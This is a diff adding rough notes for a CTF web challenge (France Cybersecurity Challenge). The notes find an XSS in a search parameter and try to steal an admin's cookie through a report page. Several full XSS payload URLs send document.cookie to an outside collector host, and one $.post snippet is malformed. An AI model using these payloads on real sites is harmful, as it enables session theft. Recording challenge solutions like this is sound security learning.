@@ -1,0 +1,32 @@
+The parameter search appears to be vulnerable to XSS
+we can indeed <script>alert(1)</script> it.
+It also has a kind of pgSQL misconfiguration as a ; throws an error, but there doesn't seem to be a way to inject anything in the db.
+
+We look at the other attack vector we have : the report page
+
+It takes an url and apparently logs it somewhere for "review".
+We can use it to steal the admin's cookie
+We set up a nice trap on our server to dump in a file all cookies received
+
+Then we forge our payload
+
+https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/flag?search=<script>window.location.href="http://flblbl.com/hack/cookie.php?"+document.cookie</script>
+
+https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/flag?search=<script>window.location.replace("http://flblbl.com/hack/cookie.php?"+document.cookie)</script>
+
+We wait for the 'admin' to open it and we get
+nothing
+
+We can also try
+
+https://gare-au-gorille.france-cybersecurity-challenge.fr/?search=%3Cimg%20src=%22static/meme_03.jpg%22/%3E
+
+
+https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/flag?search=<script>$.get("http://flblbl.com/hack/cookie.php?"+document.cookie)</script>
+
+We need to disable CSRF to send something like
+$.post("http://flblbl.com/hack/cookie.php",{c:document.cookie},dataType:"jsonp",headers={"Access-Control-Allow-Origin":"*","accept":"application/json"})
+
+https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/flag?search=<script>$.post("http://flblbl.com/hack/cookie.php",{c:document.cookie},crossDomain=true)</script>
+
+"Access-Control-Allow-Origin":"*"
